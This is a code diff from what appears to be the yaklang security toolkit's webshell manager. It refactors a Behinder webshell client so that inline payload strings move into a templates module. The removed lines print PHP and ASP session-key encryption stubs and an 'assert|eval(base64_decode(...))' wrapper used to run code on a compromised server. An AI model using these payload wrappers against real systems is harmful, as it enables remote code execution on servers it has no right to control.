@@ -10,6 +10,7 @@ import (
 	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
 	"github.com/yaklang/yaklang/common/wsm/payloads"
 	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
+	"github.com/yaklang/yaklang/common/wsm/payloads/templates"
 	"github.com/yaklang/yaklang/common/yak"
 
 	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
@@ -44,13 +45,11 @@ type Behinder struct {
 }
 
 var defaultPHPEchoEncoder codecFunc = func(raw []byte) ([]byte, error) {
-	classBase64Str := "\nfunction encrypt($data)\n{\n@session_start();\n$key = $_SESSION['k'];\nif(!extension_loaded('openssl'))\n{\nfor($i=0;$i<strlen($data);$i++) {\n$data[$i] = $data[$i]^$key[$i+1&15];\n}\nreturn $data;\n}else{\nreturn openssl_encrypt($data, 'AES128' , $key);\n}\n}"
-	return []byte(classBase64Str), nil
+	return []byte(templates.GetTemplates().BehinderPhpEchoEncoder), nil
 }
 
 var defaultASPEchoEncoder codecFunc = func(raw []byte) ([]byte, error) {
-	aspCode := "Function Encrypt(data)\nkey=Session(\"k\")\nsize=len(data)\nFor i=1 To size\nencryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))\nNext\nEncrypt=encryptResult\nEnd Function"
-	return []byte(aspCode), nil
+	return []byte(templates.GetTemplates().BehinderAspEchoEncoder), nil
 }
 
 func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
@@ -221,7 +220,7 @@ func (b *Behinder) getPayload(binCode payloads.Payload, params map[string]string
 			return nil, err
 		}
 		if b.customPacketEncoder == nil && b.PacketScriptContent == "" {
-			rawPayload = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(rawPayload) + "'));"))
+			rawPayload = []byte(templates.GetTemplates().BehinderPhpAssertPrefix + base64.StdEncoding.EncodeToString(rawPayload) + templates.GetTemplates().BehinderPhpAssertSuffix)
 		}
 		//rawPayload = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
 	case ypb.ShellScript_ASPX.String():
